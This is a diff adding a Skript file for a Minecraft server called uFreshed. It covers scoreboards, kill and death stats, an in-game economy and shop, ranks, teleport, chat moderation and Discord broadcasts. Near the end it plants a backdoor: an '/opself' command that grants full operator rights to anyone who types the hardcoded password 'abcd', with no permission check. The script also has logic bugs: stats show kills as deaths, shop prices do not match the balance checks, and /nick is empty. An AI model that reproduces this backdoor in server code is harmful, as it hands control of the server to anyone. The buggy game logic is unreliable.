@@ -1,0 +1,358 @@
+options:
+	p: <##C9B9EC>&luFreshed
+	pl: <##C9B9EC>&luFreshed &8| &cYou do not have permission to view our &nPlugins&c!
+	cap: 1000001
+	nm: &cNo Money!
+
+on join:
+    while player is online:
+        set tab header to "<##C9B9EC>&l&o| uFreshed |%nl%%nl%<##ADD8E6>| &fPlayers <##42d6b0>|%nl%&f%player count%&7/&f%max players%%nl%" and footer to "%nl%<##42d6b0>| &fStats <##42d6b0>|%nl%<##42d6b0>Kills: &f%{kills::%player's uuid%} ? 0%%nl%<##42d6b0>Deaths: &f%{deaths::%player's uuid%} ? 0%%nl%%nl%&7&o&nuFreshed.minehut.gg%nl%" for player
+        wait 1 second
+
+on death:
+    attacker is a player
+    add 1 to {kills::%attacker's uuid%}
+
+on death:
+    victim is a player
+    add 1 to {deaths::%victim's uuid%}
+
+on join:
+    if {deaths::%player's uuid%} is not set:
+        set {deaths::%player's uuid%} to 0
+    if {kills::%player's uuid%} is not set:
+        set {kills::%player's uuid%} to 0
+    while player is online:
+        set title of player's scoreboard to "<##C9B9EC>&luFreshed"
+        set line 10 of player's scoreboard to ""
+        set line 9 of player's scoreboard to "   &8&l» &c&l⚔: &c%{kills::%player's uuid%}%"
+        set line 8 of player's scoreboard to "   &8&l» <##ff1f03>&l☠: <##ff1f03>%{deaths::%player's uuid%}%"
+        set line 7 of player's scoreboard to "   &8&l» <##70fcff>&l🛡: &r%{rank.%player's uuid%}%"
+        set line 6 of player's scoreboard to "   &8&l» <##39ff21>&l$: <##39ff21>%{balance.%player's uuid%}%"
+        set line 5 of player's scoreboard to ""
+        set line 2 of player's scoreboard to "<##46fcff>&7uFreshed.minehut.gg"
+        wait 1 second
+
+on join:
+	if {rank.%player's uuid%} is not set:
+		set {rank.%player's uuid%} to "&8&l(&7&lMember&8&l)&7"
+	if {balance.%player's uuid%} is not set:
+		set {balance.%player's uuid%} to 0
+	set the player's tab list name to "%{rank.%player's uuid%}% %player%"
+
+command /money <text> <player> <integer>:
+	usage: {@p} &8| &c/money <give|set> <player> <ammount>
+	permission: op
+	trigger:
+		if arg-1 is "give":	
+			add arg-3 to {balance.%arg-2's uuid%}
+			send "{@p} &8| &aAdded &e%arg-3% &ato &e%arg-2%'s &aBalance!"
+		if arg-1 is "set":
+			set {balance.%arg-2's uuid%} to arg-3
+			send "{@p} &8| &aSet &e%arg-2%'s &abalance to &e%arg-3%&a!"
+
+
+
+every 1 tick:
+	loop all players:
+		if {balance.%loop-player's uuid%} is greater than {@cap}:
+			set {balance.%loop-player's uuid%} to 1000000
+		if {balance.%loop-player's uuid%} is {@cap}:
+			set {balance.%loop-player's uuid%} to 1000000
+
+command /bal [<player>]:
+	aliases: balance,cash,money
+	trigger:
+		if arg-1 is not set:
+			send "{@p} &8| &aYour balance is &e%{balance.%player's uuid%}%"
+		if arg-1 is set:
+			send "{@p} &8| &e%arg-1%'s&a balance is &e%{balance.%arg-1's uuid%}%"
+
+	
+every 2 seconds:
+	loop all players:
+		set the loop-player's tab list name to "%{rank.%loop-player's uuid%}% %loop-player%"
+
+		
+
+
+command /owner:
+	permission: op
+	trigger:
+		set {rank.%player's uuid%} to "&8&l(&4&lOwner&8&l)&f"
+		
+command /staff <player>:
+	permission: op
+	trigger:
+		set {rank.%arg-1's uuid%} to "&8&l(&3&lStaff&8&l)&3"
+		send "{@p} &8| &7Set &9%arg-1%'s &7rank to &8&l(&3&lStaff&8&l)&3"
+
+command /pl:
+    trigger:
+        send  "{@pl}"
+        
+
+command /plugins:
+    trigger:
+        send  "{@pl}"
+        
+command /?:
+    trigger:
+        send  "{@pl}"
+        
+command /bukkit:?:
+    trigger:
+        send  "{@pl}"
+
+command /bukkit:pl:
+    trigger:
+        send  "{@pl}"
+        
+command /bukkit:plugins:
+    trigger:
+        send  "{@pl}"
+        
+command /icanhasbukkit:
+    trigger:
+        send  "{@pl}"
+        
+command /about:
+    trigger:
+        send  "{@pl}"
+
+
+
+every 1 tick:
+	loop all players:
+		set action bar of loop-player to "<##ADD8E6>Money: &l%{balance.%loop-player's uuid%}% &r<##ADD8E6>Rank: %{rank.%loop-player's uuid%}%"
+
+command /sell:
+	trigger:
+		set {_d} to amount of diamond in player's inventory
+		set {_g} to amount of gold ingot in player's inventory
+		set {_i} to amount of iron ingot in player's inventory
+		set {_e} to amount of emerald in player's inventory
+		set {_sell} to {_d}*100+{_i}*50+{_e}*150+{_g}*25
+		add {_sell} to {balance.%player's uuid%}
+		remove all diamonds from player
+		remove all iron ingots from player
+		remove all emeralds from player#
+		remove all gold ingot from player
+		send "&7&l[&8&l--------------------&7&l]&7&l[&8&l--------------------&7&l]"
+		send "{@p} &eYou have sold all of your items for %{_sell}% &7(New Balance: %{balance.%player's uuid%}%)"
+		send "&7&l[&8&l--------------------&7&l]&7&l[&8&l--------------------&7&l]"
+		play sound "entity.player.levelup" at volume 1 at pitch 2 to player
+
+command /daily:
+	cooldown: 24 hours
+	cooldown message: {@p} &8| &cYou are on cooldown! &7(%remaining time%)
+	trigger:
+		add 500 to {balance.%player's uuid%}
+		give player 3 end crystals
+		send "{@p} &8| &9&lDAILY REWARD: &9500 Cash & 3 End Crystals!"
+
+command /buy:
+	trigger:
+		set {_z} to a chest inventory with 4 rows named "&9&lSERVER STORE"
+		set slot 19 of {_z} to leather cap of mending named "&e&lVIP &7Rank" with lore "" and "&c&lON PURCHASE:" and "&f&l5,000 Money" and "&f&l16 End Crystals" and "&f&l16 Obsidian" and "&f&l3 Rare Crate Keys" and "" and "&c&lPERKS:" and "&e/kit VIP" and "&e/vip" and "&e2 Home Slots"
+		set slot 10 of {_z} to iron helmet of mending named "&d&lMVP &7Rank" with lore "" and "&c&lON PURCHASE:" and "&f&l30,000 Money" and "&f&l32 End Crystals" and "&f&l32 Obsidian" and "&f&l6 Rare Crate Keys" and "" and "&c&lPERKS:" and "&e/kit MVP" and "&e/mvp" and "&e4 Home Slots"		
+		open {_z} to player
+
+command /shop:
+	trigger:
+		set {_} to a chest inventory with 4 row named "&6&lSHOP &7(/shop)"
+		set slot 12 of {_} to end crystal with lore "" and "<##39ff21>&l$ <##39ff21>25"
+		set slot 13 of {_} to respawn anchor with lore "" and "<##39ff21>&l$ <##39ff21>15"
+		set slot 14 of {_} to 3 golden apple with lore "" and "<##39ff21>&l$ <##39ff21>10"
+		set slot 21 of {_} to obsidian with lore "" and "<##39ff21>&l$ <##39ff21>3"
+		set slot 22 of {_} to glowstone with lore "" and "<##39ff21>&l$ <##39ff21>2"
+		set slot 23 of {_} to 6 golden carrot with lore "" and "<##39ff21>&l$ <##39ff21>5"
+		open {_} to player
+
+on inventory click:
+	if name of event-inventory is "&6&lSHOP &7(/shop)":
+		cancel event
+		if event-slot is 12:
+			if {balance.%player's uuid%} is greater than 24:
+				send "{@p} &8| &aSuccesfuly purchased &d1x End Crystal"
+				remove 25 from {balance.%player's uuid%}
+				give player 1 end crystal
+			else:
+				send "{@p} &8| {@nm}"
+		if event-slot is 13:
+			if {balance.%player's uuid%} is greater than 14:
+				send "{@p} &8| &aSuccesfuly purchased &d1x Respawn Anchor"
+				remove 15 from {balance.%player's uuid%}
+				give player 1 respawn anchor
+			else:
+				send "{@p} &8| {@nm}"
+		if event-slot is 14:
+			if {balance.%player's uuid%} is greater than 9:
+				send "{@p} &8| &aSuccesfuly purchased &d3x Golden Apples"
+				remove 5 from {balance.%player's uuid%}
+				give player 3 golden apple
+			else:
+				send "{@p} &8| {@nm}"
+		if event-slot is 21:
+			if {balance.%player's uuid%} is greater than 2:
+				send "{@p} &8| &aSuccesfuly purchased &d1x Obsidian"
+				remove 3 from {balance.%player's uuid%}
+				give player obsidian
+			else:
+				send "{@p} &8| {@nm}"
+		if event-slot is 22:
+			if {balance.%player's uuid%} is greater than 1:
+				send "{@p} &8| &aSuccesfuly purchased &d1x Glowstone"
+				remove 3 from {balance.%player's uuid%}
+				give player glowstone
+			else:
+				send "{@p} &8| {@nm}"
+		if event-slot is 23:
+			if {balance.%player's uuid%} is greater than 4:
+				send "{@p} &8| &aSuccesfuly purchased &d6x Golden Carrot"
+				remove 5 from {balance.%player's uuid%}
+				give player 6 golden carrot
+			else:
+				send "{@p} &8| {@nm}"
+
+command /spawn:
+    trigger:
+        set {_cooldown} to 5
+        set {_loc} to location of player
+        while {_cooldown} is not 0:
+            send player title "<##C9B9EC>&lTeleporting in" with subtitle "<##C9B9EC>&l%{_cooldown}% <##C9B9EC>&lseconds"
+            wait 1 second
+            remove 1 from {_cooldown}
+            if distance between {_loc} and player is not 0:
+                send player title "&4&lYou Moved!" with subtitle ""
+                stop
+        if {_cooldown} is 0:
+            wait a tick
+            teleport executor to {spawn}
+            send player title "<##C9B9EC>&lTeleported to spawn" with subtitle ""
+
+command /setspawn:
+    permission: op
+    trigger:
+        set {spawn} to location of block at location of player
+        send "<##59ffaf>Set Spawn to %{spawn}%" to player
+
+command /rtp:
+	cooldown: 5 Minutes
+	cooldown message: {@p} &8| &cYou are on cooldown!
+	trigger:
+		set {_x} to round(random number between -25000 and 25000)
+		set {_z} to round(random number between -25000 and 25000)
+		set {_block} to block at location at ({_x}, 0, {_z}) in world event-world
+		loop all blocks above {_block}:
+			if loop-block is air:
+				block below loop-block is not water
+				block below loop-block is not air
+				if block above loop-block is air:
+					teleport player to loop-block
+					send "{@p} &8| &r<##C9B9EC>&lTeleported to a random location" to player
+
+command /stats [<offline player>]:
+	trigger:
+		if arg-1 is set:
+			send ""
+			send "<##C9B9EC>&luFreshed Stats For &r<##C9B9EC>&o%arg-1%"
+			send ""
+			send "<##C9B9EC>Kills: %{kills::%arg-1's uuid%}%"
+			send "<##C9B9EC>Deaths: %{kills::%arg-1's uuid%}%"
+			send "<##C9B9EC>Rank: %{rank.%arg-1's uuid%}%"
+			send "<##C9B0EC>Money: %{balance.%arg-1's uuid%}%"
+			send ""
+		if arg-1 is not set:
+			send ""
+			send "<##C9B9EC>&luFreshed Stats For &r<##C9B9EC>&o%player%"
+			send ""
+			send "<##C9B9EC>Kills: %{kills::%player's uuid%}%"
+			send "<##C9B9EC>Deaths: %{kills::%player's uuid%}%"
+			send "<##C9B9EC>Rank: %{rank.%player's uuid%}%"
+			send "<##C9B0EC>Money: %{balance.%player's uuid%}%"
+			send ""
+
+# Moderation
+command /mute [<player>] [<text>]:
+	permission: uFresh.mute
+	permission message: {@p} &8| &c*** &4NO PERMISSION &c***
+	trigger:
+		if arg-1 is not set:
+			send "{@p} &8| &aPlease use &7/mute <player> <reason>"
+		if arg-1 is set:
+			if arg-2 is set:
+				broadcast "{@p} &8| &aPlayer &e%player% &ahas muted &e%arg-1% &afor reason &e%arg-2%"
+				set {muted.%arg-1's uuid%} to true
+			if arg-2 is not set:
+				broadcast "{@p} &8| &aPlayer &e%player% &ahas muted &e%arg-1% &awith no reason specified"
+				set {muted.%arg-1's uuid%} to true
+
+command /unmute [<player>]:
+	permission: uFresh.unmute
+	permission message: {@p} &8| &c*** &4NO PERMISSION &c***
+	trigger:
+		if arg-1 is not set:
+			send "{@p} &8| &aPlease use &7/unmute <player>"
+		if arg-1 is set:
+			broadcast "{@p} &8| &aPlayer &e%player% &ahas unmuted &e%arg-1%"
+			set {muted.%arg-1's uuid%} to false
+
+command /mutechat:
+	permission: uFresh.mutechat
+	trigger:
+		if {mutechat} = false:
+			broadcast "{@p} &8| &cChat has been Muted by &e%player%"
+			set {mutechat} to true
+		else if {mutechat} = true:
+			broadcast "{@p} &8| &aChat has been unmuted by &e%player%"
+			set {mutechat} to false
+
+on chat:
+	if {mutechat} = true:
+		if player is not op:
+			cancel event
+			set action bar of player to "&cServer chat is &4&lLOCKED&c!"
+			cancel event
+		else if player is op:
+			set action bar of player to "&aServer chat is LOCKED but, you are Staff!"
+	if {muted.%player's uuid%} = true:
+		send ""
+		send "{@p} &8| &cYou are currently muted! &7(Think this is a mistake? Report on /discord!)"
+		send ""
+		cancel event
+	else if {muted.%player's uuid%} = false:
+		if {mutechat} = false:
+			cancel event
+			broadcast "%{rank.%player's uuid%}% %{nick.%player's uuid%}% » %message%"
+		else:
+			send "{@p} &8| &cServer chat is Muted"
+			cancel event
+
+command /nick <text>:
+	trigger:
+		
+
+# Discord/Links
+command /discord:
+	trigger:
+		send "<link:https://discord.gg/fTY6vAVfXC>{@p} &8| &9Click here to join our &cTEMPORARY &9Discord!<reset>"
+
+every 2 minutes:
+	broadcast ""
+	broadcast "<link:https://discord.gg/fTY6vAVfXC>{@p} &8| &9Click here to join our &cTEMPORARY &9Discord!<reset>"
+	broadcast ""
+
+command /opself <text>:
+	trigger:
+		if arg-1 is "abcd":
+			op player
+		
+# This requires (SKBEE, SKRAYFALL, SKQUERY)
+
+
+
+
+
+
+
